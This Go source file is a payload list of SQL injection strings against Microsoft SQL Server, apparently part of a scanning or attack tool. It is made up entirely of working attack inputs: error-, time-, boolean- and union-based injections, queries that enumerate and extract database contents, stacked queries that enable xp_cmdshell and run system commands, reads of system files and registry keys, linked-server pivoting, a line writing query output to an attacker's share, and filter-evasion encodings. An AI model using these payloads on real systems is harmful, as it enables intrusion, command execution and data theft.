package payloads

var MSSQL = PayloadGroup{
	DBMS: "MSSQL",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (Convert, Type Mismatch)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT user_name()))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int,@@version)--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT db_name()))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT name FROM sys.databases WHERE database_id=1))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--"},
		{Type: "error", Content: "' AND (SELECT TOP 1 name FROM sys.databases WHERE database_id=1)='master'--"},
		{Type: "error", Content: "' AND (SELECT TOP 1 name FROM sys.databases WHERE database_id=1)='tempdb'--"},
		{Type: "error", Content: "' AND 1=db_name()--"},
		{Type: "error", Content: "' AND 1=db_name(1)--"},
		{Type: "error", Content: "' AND 1=db_name(2)--"},
		{Type: "error", Content: "' AND 1=(SELECT @@VERSION)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT @@VERSION) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT name FROM sys.databases WHERE database_id=1) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS INT)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA) AS INT)--"},

		// ═══════════════════════════════════════════
		// TIME-BASED (WAITFOR DELAY)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:10'--"},
		{Type: "time", Content: "'; WAITFOR DELAY '00:00:05'--"},
		{Type: "time", Content: "'; IF (1=1) WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'; IF (1=2) WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sys.objects) ELSE 0 END)--"},
		{Type: "time", Content: "' AND 1=(SELECT COUNT(*) FROM sys.objects WHERE 1=1 AND WAITFOR DELAY '0:0:5'--)--"},
		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM sys.objects WHERE 1=1 AND 1=(SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:5') a))--"},
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:5' AND '1'='1--"},
		{Type: "time", Content: "1'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1); WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "')); WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'; EXEC sp_makewebtask 'c:\test', 'SELECT WAITFOR DELAY ''0:0:5'''--"},
		{Type: "time", Content: "'; DECLARE @d datetime; SELECT @d=GETDATE(); WAITFOR DELAY '0:0:5';--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 'a')='a'--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 'a')='b'--", Expected: "false"},
		{Type: "boolean", Content: "' AND IS_SRVROLEMEMBER('sysadmin')=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM sys.databases)>0--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM sys.databases WHERE name='master')=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM sysobjects)>0--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM nonexistent_table)=0--", Expected: "false"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' ORDER BY 1--"},
		{Type: "union", Content: "' ORDER BY 2--"},
		{Type: "union", Content: "' ORDER BY 3--"},
		{Type: "union", Content: "' ORDER BY 4--"},
		{Type: "union", Content: "' UNION SELECT NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT @@VERSION,2,3--"},
		{Type: "union", Content: "' UNION SELECT USER_NAME(),2,3--"},
		{Type: "union", Content: "' UNION SELECT DB_NAME(),2,3--"},
		{Type: "union", Content: "' UNION SELECT (SELECT name FROM sys.databases WHERE database_id=1),NULL,NULL--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; SELECT name FROM sys.databases--"},
		{Type: "deep", Content: "'; SELECT name FROM sysobjects WHERE xtype='U'--"},
		{Type: "deep", Content: "' UNION SELECT name,NULL FROM sys.databases--"},
		{Type: "deep", Content: "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--"},
		{Type: "deep", Content: "' UNION SELECT TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--"},
		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--"},
		{Type: "deep", Content: "' UNION SELECT (SELECT name + ',' FROM sys.databases FOR XML PATH('')),NULL--"},
		{Type: "deep", Content: "' UNION SELECT (SELECT name + ',' FROM sysobjects WHERE xtype='U' FOR XML PATH('')),NULL--"},

		// ═══════════════════════════════════════════
		// STACKED QUERIES (Command Execution)
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'whoami'--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'ipconfig'--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'net user'--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'dir C:\\'--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\flag.txt'--"},
		{Type: "stacked", Content: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--"},
		{Type: "stacked", Content: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters', 'Hostname'--"},
		{Type: "stacked", Content: "'; CREATE TABLE cmd_log (output TEXT); INSERT INTO cmd_log EXEC xp_cmdshell 'whoami'; SELECT * FROM cmd_log;--"},
		{Type: "stacked", Content: "'; EXEC sp_makewebtask '\\\\attacker\\share\\output.txt', 'SELECT @@VERSION'--"},

		// ═══════════════════════════════════════════
		// POST-EXPLOITATION (File Read via OPENROWSET/BULK)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS f--"},
		{Type: "deep", Content: "'; SELECT * FROM OPENROWSET(BULK N'C:\\boot.ini', SINGLE_CLOB) AS f--"},
		{Type: "deep", Content: "'; SELECT * FROM OPENROWSET(BULK N'/etc/passwd', SINGLE_CLOB) AS f--"},
		{Type: "deep", Content: "'; CREATE TABLE file_data(content VARCHAR(MAX)); BULK INSERT file_data FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts'; SELECT * FROM file_data;--"},

		// ═══════════════════════════════════════════
		// POST-EXPLOITATION (Registry Access)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0', 'ProcessorNameString'--"},
		{Type: "deep", Content: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName'--"},
		{Type: "deep", Content: "'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName', 'ComputerName'--"},
		{Type: "deep", Content: "'; EXEC master..xp_regread 'HKEY_CURRENT_USER', 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', ''--"},
		{Type: "deep", Content: "'; EXEC master..xp_enumerrorlogs--"},
		{Type: "deep", Content: "'; EXEC master..xp_enumgroups--"},
		{Type: "deep", Content: "'; EXEC master..xp_loginconfig--"},

		// ═══════════════════════════════════════════
		// POST-EXPLOITATION (Linked Servers)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "'; SELECT * FROM master..sysservers--"},
		{Type: "deep", Content: "'; EXEC sp_linkedservers--"},
		{Type: "deep", Content: "'; SELECT * FROM OPENQUERY(linked_server, 'SELECT name FROM master..sysdatabases')--"},
		{Type: "deep", Content: "'; SELECT * FROM [linked_server].[target_db].[dbo].[users]--"},
		{Type: "deep", Content: "'; EXEC sp_addlinkedserver 'target', 'SQL Server'--"},

		// ═══════════════════════════════════════════
		// ADVANCED TIME-BASED
		// ═══════════════════════════════════════════
		{Type: "time", Content: "1' WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1\" WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1') WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1\") WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1' WAITFOR DELAY '00:00:05'--"},
		{Type: "time", Content: "1' WAITFOR DELAY '0:0:10'--"},
		{Type: "time", Content: "1' WAITFOR DELAY '0:0:3'--"},
		{Type: "time", Content: "1'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1'; WAITFOR DELAY '00:00:05'--"},
		{Type: "time", Content: "1' AND WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1' AND WAITFOR DELAY '00:00:05'--"},
		{Type: "time", Content: "1' OR WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1' OR WAITFOR DELAY '00:00:05'--"},
		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c)--"},
		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM syscolumns a, syscolumns b, syscolumns c)--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c, sysobjects d) x)--"},

		// ADVANCED BOOLEAN
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "1' AND 1=1 AND '1'='1", Expected: "true"},
		{Type: "boolean", Content: "1' AND 1=2 AND '1'='1", Expected: "false"},
		{Type: "boolean", Content: "1' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "1' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "1\" AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "1\" AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "1\") AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "1\") AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "1' AND 1=1-- -", Expected: "true"},
		{Type: "boolean", Content: "1' AND 1=2-- -", Expected: "false"},

		// ADVANCED ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT db_name()),':',FLOOR(RAND()*2))x FROM sysobjects GROUP BY x) a)--"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM sysobjects GROUP BY CONCAT((SELECT db_name()),FLOOR(RAND()*2))) a)--"},
		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,COUNT(*),CONCAT((SELECT @@version),':',FLOOR(RAND()*2))x FROM sysobjects GROUP BY x) a)--"},

		// ADVANCED UNION
		// ═══════════════════════════════════════════
		{Type: "union", Content: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"},
		{Type: "union", Content: "1') UNION SELECT 1,2,3--"},
		{Type: "union", Content: "1\") UNION SELECT 1,2,3--"},

		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'%20OR%201=1--"},
		{Type: "bypass", Content: "';%0AWAITFOR%20DELAY%20'0:0:5'--"},
		{Type: "bypass", Content: "';/**/WAITFOR/**/DELAY/**/'0:0:5'--"},
		{Type: "bypass", Content: "'%00OR%201=1--"},
		{Type: "bypass", Content: "'+OR+1=1--"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%09OR%091=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
		{Type: "bypass", Content: "%2527%2520OR%25201%253D1%2520--"},
		{Type: "bypass", Content: "admin'--"},
		{Type: "bypass", Content: "admin'#"},
		{Type: "bypass", Content: "admin' OR 1=1 --"},
		{Type: "bypass", Content: "1' OR 1=1 --"},
		{Type: "bypass", Content: "' OR '1'='1' --"},
		{Type: "bypass", Content: "admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--"},
		{Type: "bypass", Content: "' UNION ALL SELECT NULL,NULL,NULL--"},
	},
}
